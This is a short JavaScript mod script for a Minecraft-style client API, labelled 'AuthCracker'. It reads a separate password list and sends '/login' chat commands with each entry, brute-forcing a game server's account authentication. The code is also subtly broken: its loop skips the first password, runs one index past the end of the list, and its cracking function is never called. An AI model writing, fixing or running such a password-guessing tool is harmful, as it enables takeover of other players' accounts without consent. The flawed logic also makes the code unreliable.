ModAPI.require("player");
//also add passwords.js file
let playerFound = false;

function checkForGame() {
    if (typeof ModAPI.player !== 'undefined') {
        playerFound = true;
    } else {
        console.log('Player doesn\'t exist yet, please join a server or singleplayer world...');
    }
}

checkForGame();

var passCount = passwords.length;

function runPassword() {
        for (let i = 1; i <= passCount; i++) {
            ModAPI.player.sendChatMessage({message: '/login ' + passwords[i]});
        }
}

if (playerFound) {
    ModAPI.displayToChat({msg: "Running AuthCracker!"});
} else {
    checkForGame();
}